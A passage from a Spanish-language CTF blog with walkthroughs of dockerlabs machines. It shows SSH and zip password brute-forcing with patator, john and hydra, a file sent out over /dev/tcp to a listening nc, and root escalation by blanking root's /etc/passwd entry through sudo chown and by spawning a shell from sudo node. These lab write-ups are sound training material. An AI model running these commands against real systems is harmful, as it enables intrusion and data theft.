23:37:21 patator    INFO - 1     22     0.072 | root-false                         |     1 | Authentication failed.
23:37:21 patator    INFO - 1     22     0.018 | sambauser                          |     2 | Authentication failed.
23:37:21 patator    INFO - 0     40     0.025 | passsamba                          |     3 | SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5
</code></pre></div></div>

<p>Como podemos ver con el user <strong>passsamba</strong> obtendríamos acceso al sistema.</p>

<h1 id="intrusión">Intrusión</h1>

<p>Nos conectamos al sistema usando la clave privada:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh <span class="nt">-i</span> <span class="nb">id </span>passsamba@172.18.0.2
Welcome to Ubuntu 24.04 LTS <span class="o">(</span>GNU/Linux 6.8.11-amd64 x86_64<span class="o">)</span>
passsamba@64a2dd61671c:~<span class="err">$</span>
</code></pre></div></div>

<p>Leemos el fichero <strong>note.txt</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>passsamba@64a2dd61671c:~<span class="nv">$ </span><span class="nb">cat </span>note.txt 

What would <span class="s2">"sambaarribasiempre"</span> be used <span class="k">for</span>?
</code></pre></div></div>

<p>Veamos para que sirve… usando <strong>patator</strong> de nuevo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>patator ssh_login <span class="nv">host</span><span class="o">=</span>172.18.0.2 <span class="nv">user</span><span class="o">=</span>FILE0 <span class="nv">password</span><span class="o">=</span>sambaarribasiempre <span class="nv">0</span><span class="o">=</span>users.txt
23:40:33 patator    INFO - code  size    <span class="nb">time</span> | candidate                          |   num | mesg
23:40:33 patator    INFO - <span class="nt">-----------------------------------------------------------------------------</span>
23:40:33 patator    INFO - 0     40     0.086 | sambauser                          |     2 | SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5
23:40:36 patator    INFO - 1     22     2.671 | passsamba                          |     3 | Authentication failed.
23:40:36 patator    INFO - 1     22     2.920 | root-false                         |     1 | Authentication failed.
</code></pre></div></div>

<p>Son las credenciales de <strong>sambauser</strong>.</p>

<h1 id="movimientos-laterales">Movimientos laterales</h1>

<p>Nos cambiamos al user <strong>sambauser</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>passsamba@64a2dd61671c:~<span class="nv">$ </span>su sambauser
Password: 
sambauser@64a2dd61671c:/home/passsamba<span class="nv">$ </span><span class="nb">cd
</span>sambauser@64a2dd61671c:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>sambauser<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>sambauser<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>sambauser<span class="o">)</span>,100<span class="o">(</span><span class="nb">users</span><span class="o">)</span>
sambauser@64a2dd61671c:~<span class="err">$</span>
</code></pre></div></div>

<p>Buscamos donde está ubicado el recurso compartido en el sistema:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sambauser@64a2dd61671c:/<span class="nv">$ </span>find / <span class="nt">-name</span> read_only_share 2&gt;/dev/null
/srv/samba/read_only_share
</code></pre></div></div>

<p>Encontramos un fichero <strong>secret.txt</strong>. Nos lo pasamos a nuestra máquina, para ello nos ponemos a la escucha con <strong>nc</strong> redirigiendo la salida al fichero secret.txt y nos lo mandamos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8888 <span class="o">&gt;</span> secret.zip
listening on <span class="o">[</span>any] 8888 ...

sambauser@64a2dd61671c:~<span class="nv">$ </span><span class="nb">cat</span> /srv/samba/read_only_share/secret.zip <span class="o">&gt;</span> /dev/tcp/172.18.0.1/8888
</code></pre></div></div>

<p>Con <strong>patator</strong> y el módulo <strong>unzip_pass</strong> obtenemos la contraseña del fichero zip:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>patator unzip_pass <span class="nv">zipfile</span><span class="o">=</span>secret.zip <span class="nv">password</span><span class="o">=</span>FILE0 <span class="nv">0</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nt">-x</span> ignore:code!<span class="o">=</span>0
23:50:13 patator    INFO - code  size    <span class="nb">time</span> | candidate                          |   num | mesg
23:50:13 patator    INFO - <span class="nt">-----------------------------------------------------------------------------</span>
23:50:16 patator    INFO - 0     82     0.006 | qwert
</code></pre></div></div>

<p>Lo descomprimimos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>7z x secret.zip

<span class="nv">$ </span><span class="nb">cat </span>secret.txt
root-false:cGFzc3dvcmRiYWRzZWN1cmV1bHRyYQ<span class="o">==</span>
</code></pre></div></div>

<p>Y desciframos la clave:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'cGFzc3dvcmRiYWRzZWN1cmV1bHRyYQ=='</span> | <span class="nb">base64</span> <span class="nt">-d</span>
passwordbadsecureultra
</code></pre></div></div>

<p>Nos movemos a <strong>root-false</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sambauser@64a2dd61671c:~<span class="nv">$ </span>su root-false
Password: 
root-false@64a2dd61671c:/home/sambauser<span class="nv">$ </span><span class="nb">whoami
</span>root-false
</code></pre></div></div>

<p>Leemos el mensaje:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root-false@64a2dd61671c:~<span class="nv">$ </span><span class="nb">cat </span>message.txt 

Mario, remember this word, <span class="k">then </span>the boss will get angry:

<span class="s2">"pinguinodemarioelmejor"</span>
</code></pre></div></div>

<p>Buscando por el sistema encontramos que hay una segunda web:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root-false@64a2dd61671c:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /etc/apache2/sites-available/
total 16
<span class="nt">-rw-r--r--</span> 1 root root 1286 Mar 18 13:35 000-default.conf
<span class="nt">-rw-r--r--</span> 1 root root 4573 Mar 18 13:35 default-ssl.conf
<span class="nt">-rw-r--r--</span> 1 root root  386 Aug 27 11:03 second-site.conf
</code></pre></div></div>

<p>Vemos que contiene:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root-false@64a2dd61671c:~<span class="nv">$ </span><span class="nb">cat</span> /etc/apache2/sites-available/second-site.conf 
&lt;VirtualHost 10.10.11.5:80&gt;
    ServerName 10.10.11.5
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/second-site

    &lt;Directory /var/www/second-site&gt;
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
    &lt;/Directory&gt;

    ErrorLog <span class="k">${</span><span class="nv">APACHE_LOG_DIR</span><span class="k">}</span>/error.log
    CustomLog <span class="k">${</span><span class="nv">APACHE_LOG_DIR</span><span class="k">}</span>/access.log combined
&lt;/VirtualHost&gt;
</code></pre></div></div>

<p>Vemos que la web hay un formulario para hacer login. Tras probar con los usuarios que conocemos y no obtener acceso probamos con el user mario y obtenemos acceso. Como vemos, usando -vvv en curl, vemos que la respuesta ha sido <code class="language-plaintext highlighter-rouge">HTTP/1.1 302 Found</code> y nos redirige a <code class="language-plaintext highlighter-rouge">Location: super_secure_page/admin.php</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root-false@64a2dd61671c:~<span class="nv">$ </span>curl <span class="nt">-vvv</span> <span class="nt">-H</span> <span class="s2">"Content-Type: application/x-www-form-urlencoded"</span>  <span class="nt">-d</span> <span class="s1">'username=mario&amp;password=pinguinodemarioelmejor'</span> http://10.10.11.5/
<span class="k">*</span>   Trying 10.10.11.5:80...
<span class="k">*</span> Connected to 10.10.11.5 <span class="o">(</span>10.10.11.5<span class="o">)</span> port 80
<span class="o">&gt;</span> POST / HTTP/1.1
<span class="o">&gt;</span> Host: 10.10.11.5
<span class="o">&gt;</span> User-Agent: curl/8.5.0
<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
<span class="o">&gt;</span> Content-Type: application/x-www-form-urlencoded
<span class="o">&gt;</span> Content-Length: 46
<span class="o">&gt;</span> 
&lt; HTTP/1.1 302 Found
&lt; Date: Mon, 02 Sep 2024 22:24:41 GMT
&lt; Server: Apache/2.4.58 <span class="o">(</span>Ubuntu<span class="o">)</span>
&lt; Location: super_secure_page/admin.php
&lt; Content-Length: 0
&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
&lt; 
<span class="k">*</span> Connection <span class="c">#0 to host 10.10.11.5 left intact</span>
</code></pre></div></div>

<p>Accedemos a la nueva ruta y en el código fuente encontramos el siguiente comentario:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root-false@64a2dd61671c:~<span class="nv">$ </span>curl http://10.10.11.5/super_secure_page/admin.php

&lt;<span class="o">!</span><span class="nt">--ultramegatextosecret</span>.txt--&gt;
</code></pre></div></div>

<p>Accedemos al fichero:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root-false@64a2dd61671c:~<span class="nv">$ </span>curl http://10.10.11.5/ultramegatextosecret.txt

En el reino de los hongos, se encontraba un lugar mágico y poco conocido: el Bosque de Nieve Eterna. Este bosque estaba cubierto de un manto blanco y brillante todo el año, y albergaba muchas criaturas fantásticas y secretos ocultos. Entre ellos, había una leyenda que hablaba de un pingüino muy especial que guardaba un gran secreto.

El pingüino en cuestión no era un pingüino común. Se llamaba Pinguino y era el guardián de un antiguo artefacto mágico conocido como el Cristal de la Aurora. Según la leyenda, el Cristal tenía el poder de controlar el clima y podía traer tanto la eterna primavera como un invierno sin fin, dependiendo de la voluntad de su portador.

Una tarde, mientras Mario exploraba el Bosque de Nieve Eterna, llegó a un claro donde vio a Pinguino deslizarse alegremente por una pista de hielo. Mario, siempre curioso, se acercó al pingüino y le preguntó sobre el cristal.

Pinguino, con una mirada sabia en sus ojos, le dijo a Mario que el Cristal de la Aurora estaba escondido en una cueva secreta bajo el lago helado del bosque. Sin embargo, solo el corazón puro y valiente de un verdadero héroe podría encontrarlo. La entrada a la cueva estaba oculta por una mágica capa de hielo que solo se derretía cuando alguien con buenas intenciones realizaba un acto de bondad.

Mario decidió aceptar el desafío. Durante su travesía, ayudó a los habitantes del bosque: rescató a un grupo de conejos atrapados en una tormenta de nieve, reparó una antigua fuente que había sido dañada por un deshielo imprevisto y, sobre todo, demostró su valentía enfrentando a una banda de Koopa Troopas que habían estado causando estragos en la región.

Al realizar estos actos de bondad, el hielo sobre el lago comenzó a derretirse, revelando una entrada oculta en la cueva. Mario entró con cuidado y, con la guía de Pinguino, encontró el Cristal de la Aurora brillando en su pedestal.

El pingüino le explicó que el cristal no solo tenía el poder de controlar el clima, sino que también representaba el equilibrio y la armonía entre las estaciones. Mario comprendió que era esencial mantener ese equilibrio para el bienestar de todo el reino.

Con el Cristal_de_la_Aurora a salvo, Mario y Pinguino regresaron al claro del bosque. El pingüino le agradeció a Mario por su valentía y bondad, y le dijo que siempre podría contar con el bosque para cualquier futuro desafío.

Desde ese día, Mario visitó el Bosque de Nieve Eterna cada vez que necesitaba un consejo sabio, y la leyenda del pingüino guardián del cristal se convirtió en una historia popular en el Reino de los Hongos, recordando a todos que la bondad y la valentía siempre encuentran su recompensa.

by less

</code></pre></div></div>

<p>Lo único que llama la atención es <strong>Cristal_de_la_Aurora.</strong> Probamos a usarlo para movernos a <strong>less:</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root-false@64a2dd61671c:~<span class="nv">$ </span>su less
Password: 
less@64a2dd61671c:/home/root-false<span class="err">$</span>
</code></pre></div></div>

<p>Vemos que puede ejecutar como <strong>root</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>less@64a2dd61671c:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>less on 64a2dd61671c:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin,
    use_pty

User less may run the following commands on 64a2dd61671c:
    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /bin/chown
</code></pre></div></div>

<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>

<p>Vamos a cambiar los permisos al fichero <code class="language-plaintext highlighter-rouge">/etc/passwd</code> para que sea propiedad de <strong>less</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>less@64a2dd61671c:~<span class="nv">$ </span><span class="nb">sudo chown </span>less:less /etc/passwd
</code></pre></div></div>

<p>Después editamos el fichero. Borramos la <strong>x</strong> que esta entre root y 0.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>less@64a2dd61671c:~<span class="nv">$ </span>nano /etc/passwd
<span class="c"># Antes</span>
root:x:0:0:root:/root:/bin/bash

<span class="c"># Después</span>
root::0:0:root:/root:/bin/bash
</code></pre></div></div>

<p>Y con ese cambio nos podemos logear como root sin contraseña.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>less@64a2dd61671c:~<span class="nv">$ </span>su
root@64a2dd61671c:/home/less# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root@64a2dd61671c:/home/less#
</code></pre></div></div>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="dockerlabs" /><category term="ctf" /><category term="linux" /><category term="dificil" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">NodeClimb</title><link href="/posts/nodeclimb/" rel="alternate" type="text/html" title="NodeClimb" /><published>2024-07-05T00:00:00+00:00</published><updated>2024-07-05T00:00:00+00:00</updated><id>/posts/nodeclimb</id><content type="html" xml:base="/posts/nodeclimb/"><![CDATA[<p><img src="/assets/images/node/node.png" alt="image" /></p>

<p>Estamos ante un docker que contiene una distribución Linux. Es de nivel fácil y es de la plataforma <a href="https://dockerlabs.es/">dockerlabs</a>.</p>

<h1 id="enumeración">Enumeración</h1>

<p>Ponemos el docker en marcha con el <code class="language-plaintext highlighter-rouge">auto_deploy.sh</code> que trae el zip. Cuando termina de cargar nos indica la dirección IP de nuestra víctima, en nuestro caso es <code class="language-plaintext highlighter-rouge">172.17.0.2</code>.</p>

<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">172.17.0.2</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 172.17.0.2
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
</code></pre></div></div>

<p>Vemos que solo tiene los puertos <strong>21</strong> y <strong>22</strong>  abiertos. Vamos a realizar otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code> pero esta vez para detectar la versión del servicio que este corriendo, <code class="language-plaintext highlighter-rouge">-sV</code>, y para ejecutar los scripts por defecto para detectar vulnerabilidades, <code class="language-plaintext highlighter-rouge">-sC</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p21</span>,22 172.17.0.2
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
|_-rw-r--r--    1 0        0             242 Jul 05 09:34 secretitopicaron.zip
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged <span class="k">in </span>as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 <span class="nb">cd</span>:1f:3b:2d:c4:0b:99:03:e6:a3:5c:26:f5:4b:47:ae <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 a0:d4:92:f6:9b:db:12:2b:77:b6:b1:58:e0:70:56:f0 <span class="o">(</span>ED25519<span class="o">)</span>
</code></pre></div></div>

<h1 id="intrusión">Intrusión</h1>

<p>Vemos que nos podemos conectar al servidor <strong>ftp</strong> como usuario <em>anónimo</em> y que además hay un fichero a nuestro alcance. Entramos como <strong>ftp</strong> y nos lo descargamos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ftp ftp@172.17.0.2
Connected to 172.17.0.2.
220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
331 Please specify the password.
Password: 
230 Login successful.
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt; <span class="nb">ls
</span>229 Entering Extended Passive Mode <span class="o">(||</span>|8580|<span class="o">)</span>
150 Here comes the directory listing.
<span class="nt">-rw-r--r--</span>    1 0        0             242 Jul 05 09:34 secretitopicaron.zip
226 Directory send OK.
ftp&gt; get secretitopicaron.zip
<span class="nb">local</span>: secretitopicaron.zip remote: secretitopicaron.zip
229 Entering Extended Passive Mode <span class="o">(||</span>|49269|<span class="o">)</span>
150 Opening BINARY mode data connection <span class="k">for </span>secretitopicaron.zip <span class="o">(</span>242 bytes<span class="o">)</span><span class="nb">.</span>
100% |<span class="k">******************</span>|   242        1.77 MiB/s    00:00 ETA
226 Transfer complete.
242 bytes received <span class="k">in </span>00:00 <span class="o">(</span>183.76 KiB/s<span class="o">)</span>
ftp&gt; bye
221 Goodbye.
</code></pre></div></div>

<p>Intentamos descomprimirlo pero vemos que tiene una contraseña. Creamos el hash del fichero zip con <strong>zip2john</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>zip2john secretitopicaron.zip <span class="o">&gt;</span> zip.hash
ver 1.0 efh 5455 efh 7875 secretitopicaron.zip/password.txt PKZIP Encr: 2b chk, TS_chk, <span class="nv">cmplen</span><span class="o">=</span>52, <span class="nv">decmplen</span><span class="o">=</span>40, <span class="nv">crc</span><span class="o">=</span>59D5D024 <span class="nv">ts</span><span class="o">=</span>4C03 <span class="nv">cs</span><span class="o">=</span>4c03 <span class="nb">type</span><span class="o">=</span>0
</code></pre></div></div>

<p>Y después intentamos sacar la password del fichero zip:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt zip.hash 
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
password1        <span class="o">(</span>secretitopicaron.zip/password.txt<span class="o">)</span>     
1g 0:00:00:00 DONE <span class="o">(</span>2024-07-05 23:00<span class="o">)</span> 25.00g/s 102400p/s 102400c/s 102400C/s 123456..oooooo
</code></pre></div></div>

<p>En un segundo tenemos la clave, descomprimimos el fichero y la vemos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>password.txt 
mario:laKontraseñAmasmalotaHdelbarrioH
</code></pre></div></div>

<p>Nos conectamos al servidor <strong>ssh</strong> como <em>mario</em>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh mario@172.17.0.2
mario@172.17.0.2<span class="s1">'s password: 
Linux 014bc8cff695 6.8.11-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.8.11-1kali2 (2024-05-30) x86_64
</span></code></pre></div></div>

<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>

<p>Vemos que puede ejecutar como <strong>root</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mario@014bc8cff695:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>mario on 014bc8cff695:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin,
    use_pty

User mario may run the following commands on 014bc8cff695:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/node /home/mario/script.js
</code></pre></div></div>

<p>Puede ejecutar un script en node que esta vacio en el home de mario. Miramos a ver si hay algo en el historial de bash:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mario@014bc8cff695:~<span class="nv">$ </span><span class="nb">cat</span> .bash_history 
<span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">sudo</span> /usr/local/bin/node <span class="nt">-e</span> <span class="s1">'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'</span> 
/usr/local/bin/node
locate node
apt <span class="nb">install </span>locate
<span class="nb">exit
sudo</span> <span class="nt">-l</span>
/usr/bin/node
<span class="nb">sudo</span> /usr/bin/node <span class="nt">-e</span> <span class="s1">'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'</span>
<span class="nb">exit
sudo</span> <span class="nt">-l</span>
<span class="nb">ls
exit
ls
whoami
sudo</span> <span class="nt">-l</span>
<span class="nb">cat </span>script.js 
<span class="nb">ls</span> <span class="nt">-l</span>
<span class="nb">exit</span>

</code></pre></div></div>

<p>Curiosamente nos da una pista de cómo obtener la shell desde node. Añadimos al fichero <strong>script.js</strong> la función para la creación de una shell:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mario@014bc8cff695:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'</span> <span class="o">&gt;</span> script.js
</code></pre></div></div>

<p>Y ejecutamos el comando con sudo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/node /home/mario/script.js
<span class="c"># whoami;hostname;date</span>
root
014bc8cff695
Fri Jul  5 21:14:24 UTC 2024
<span class="c">#</span>
</code></pre></div></div>

<p>Con esto ya seriamos <strong>root</strong> en la máquina.</p>

<p>Un saludo</p>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="dockerlabs" /><category term="ctf" /><category term="linux" /><category term="facil" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Los 40 ladrones</title><link href="/posts/los40ladrones/" rel="alternate" type="text/html" title="Los 40 ladrones" /><published>2024-07-04T00:00:00+00:00</published><updated>2024-07-04T00:00:00+00:00</updated><id>/posts/los40ladrones</id><content type="html" xml:base="/posts/los40ladrones/"><![CDATA[<p><img src="/assets/images/los40/los40.jpg" alt="image" /></p>

<p>Estamos ante un docker que contiene una distribución Linux. Es de nivel fácil y es de la plataforma <a href="https://dockerlabs.es">dockerlabs</a>.</p>

<h1 id="enumeración">Enumeración</h1>

<p>Ponemos el docker en marcha con el <code class="language-plaintext highlighter-rouge">auto_deploy.sh</code> que trae el zip. Cuando termina de cargar nos indica la dirección IP de nuestra víctima, en nuestro caso es <code class="language-plaintext highlighter-rouge">172.17.0.2</code>.</p>

<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">172.17.0.2</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 172.17.0.2
PORT   STATE SERVICE
80/tcp open  http
</code></pre></div></div>

<p>Vemos que solo tiene el puerto <strong>80</strong> abierto. Vamos a realizar otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code> pero esta vez para detectar la versión del servicio que este corriendo, <code class="language-plaintext highlighter-rouge">-sV</code>, y para ejecutar los scripts por defecto para detectar vulnerabilidades, <code class="language-plaintext highlighter-rouge">-sC</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span> <span class="nt">-v</span> 172.17.0.2
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.58 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
</code></pre></div></div>

<p>Vemos que la web es una página por defecto de la instalación de apache. Buscamos directorios y ficheros en el servidor con <strong>feroxbuster</strong>. Buscamos las extensiones <strong>php</strong>, <strong>html</strong> y <strong>txt</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>feroxbuster <span class="nt">-u</span> http://172.17.0.2 <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt <span class="nt">-r</span> <span class="nt">-d</span> 2 <span class="nt">-x</span> php,html,txt
200      GET      367l      977w    10792c http://172.17.0.2/index.html
200      GET       22l      105w     5952c http://172.17.0.2/icons/ubuntu-logo.png
200      GET      367l      977w    10792c http://172.17.0.2/200      GET        3l       20w      111c http://172.17.0.2/qdefense.txt
</code></pre></div></div>

<p>Encontramos un fichero llamado <strong>qdefense.txt</strong>. Lo descargamos y leemos su contenido:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://172.17.0.2/qdefense.txt
Recuerda llama antes de entrar , no seas como toctoc el maleducado
7000 8000 9000
busca y llama +54 2933574639
</code></pre></div></div>

<p>De el fichero obtenemos que hay un user llamado <strong>toctoc</strong> y una secuencia de números que puede ser una secuencia de <strong>Port Knocking.</strong>  El port knocking es un mecanismo para abrir puertos externamente en un firewall mediante una secuencia preestablecida de intentos de conexión a puertos que se encuentran cerrados. Una vez que el firewall recibe una secuencia de conexión correcta, sus reglas son modificadas para permitir al host que realizó los intentos conectarse a un puerto específico.</p>

<p>Para instalar en kali el comando knock realizamos lo siguiente: <code class="language-plaintext highlighter-rouge">sudo apt update &amp;&amp; sudo apt install -y knockd</code></p>

<p>Después golpeamos los puertos en la secuencia que hemos visto:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>knock <span class="nt">-v</span> 172.17.0.2 7000 8000 9000
hitting tcp 172.17.0.2:7000
hitting tcp 172.17.0.2:8000
hitting tcp 172.17.0.2:9000
</code></pre></div></div>

<p>Realizamos un nuevo escaneo de puertos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 172.17.0.2
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
</code></pre></div></div>

<p>Ahora ya tenemos el puerto <strong>22</strong> abierto. Como tenemos un user del sistema vamos a probar a buscar la contraseña de dicho usuario con <strong>hydra</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>hydra <span class="nt">-l</span> toctoc <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt <span class="nt">-t</span> 64 <span class="nt">-VIf</span> ssh://172.17.0.2
...
826 of 14344401 <span class="o">[</span>child 12] <span class="o">(</span>0/2<span class="o">)</span>
<span class="o">[</span>22][ssh] host: 172.17.0.2   login: toctoc   password: kittycat
